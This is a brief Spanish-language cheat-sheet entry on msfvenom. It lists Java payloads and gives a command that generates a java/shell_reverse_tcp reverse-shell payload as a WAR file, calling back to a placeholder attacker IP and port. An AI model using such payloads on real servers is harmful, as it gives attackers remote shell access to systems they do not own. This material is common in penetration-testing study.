# Msfvenom

### Search

```bash
msfvenom -l payloads | grep java
```

> -l : Lista todos los payloads disponibles

### Use

```bash
msfvenom -p java/shell_reverse_tcp LHOST=IP_ATTACKER LPORT=PORT_ATTACKER -f war -o reverse.war
```

> -p : Seleccionar un payload&#x20;
>
> -f : Especifica el formato del payload como un archivo&#x20;
>
> -o : Guarda el payload generado

